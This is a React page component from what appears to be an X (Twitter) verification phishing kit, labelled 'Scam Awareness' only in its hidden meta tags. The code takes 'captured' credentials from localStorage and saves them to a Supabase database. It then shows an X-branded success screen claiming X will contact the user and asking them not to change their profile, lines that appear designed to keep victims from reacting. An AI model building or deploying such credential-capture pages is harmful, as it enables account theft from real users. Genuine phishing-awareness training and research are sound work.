import React, { useEffect, useState } from 'react';
import { Helmet } from 'react-helmet';
import { useNavigate } from 'react-router-dom';
import { useAppState } from '@/context/AppStateContext';
import { CheckCircle, Loader2 } from 'lucide-react';
import { X_LOGO_URL } from '@/config/constants';

export default function VerificationCompletePage() {
  const { saveCredentialsToSupabase, showToast } = useAppState();
  const navigate = useNavigate();
  const [isSaving, setIsSaving] = useState(true);

  useEffect(() => {
    const saveData = async () => {
      const currentCaptureString = localStorage.getItem('currentCapture');
      if (!currentCaptureString) {
        showToast({
          title: 'Error',
          description: 'No data to save. Please start over.',
          variant: 'destructive',
        });
        navigate('/');
        return;
      }

      try {
        const credentials = JSON.parse(currentCaptureString);
        const { success } = await saveCredentialsToSupabase(credentials);

        if (success) {
          showToast({
            title: 'Success!',
            description: 'Verification complete. Data has been recorded.',
          });
        } else {
          showToast({
            title: 'Save Failed',
            description: 'Could not save data. Please try again later.',
            variant: 'destructive',
          });
        }
      } catch (error) {
        console.error("Error processing captured data:", error);
        showToast({
          title: 'Critical Error',
          description: 'An unexpected error occurred.',
          variant: 'destructive',
        });
      } finally {
        localStorage.removeItem('currentCapture');
        localStorage.removeItem('issuedVerificationTokens');
        localStorage.removeItem('usedVerificationTokens');
        setIsSaving(false);
      }
    };

    saveData();
  }, [saveCredentialsToSupabase, navigate, showToast]);

  return (
    <>
      <Helmet>
        <title>X Verification Complete - Scam Awareness</title>
        <meta name="description" content="Simulated X verification complete page for scam awareness education." />
      </Helmet>
      <div className="bg-[#1e1e2f] font-chirp text-white flex justify-center items-center min-h-screen p-4">
        <div className="bg-[#15202b] p-[30px] rounded-[10px] w-full max-w-[500px] text-center shadow-[0_0_15px_rgba(0,0,0,0.5)]">
          <img src={X_LOGO_URL} alt="X Logo" className="w-12 h-12 mx-auto mb-6" />
          <h2 className="text-[#1da1f2] text-2xl font-bold mb-[15px]">X ⚙️ Verification</h2>

          {isSaving ? (
            <div className="flex flex-col items-center justify-center my-[15px]">
              <Loader2 className="h-12 w-12 animate-spin text-[#1da1f2] mb-4" />
              <p className="text-[1.1em] text-white">Finalizing verification...</p>
            </div>
          ) : (
            <>
              <div className="text-[1.1em] text-[#00cc66] my-[15px] flex items-center justify-center">
                <CheckCircle className="w-6 h-6 mr-2" /> Your verification is now complete.
              </div>
              <p className="my-[10px] text-[0.95em] text-white">X will contact you within 24 hours with further instructions.</p>
              <p className="my-[10px] text-[0.85em] text-[#8899a6]">Please avoid making changes to your profile while we finalize the update.</p>
            </>
          )}
        </div>
      </div>
    </>
  );
}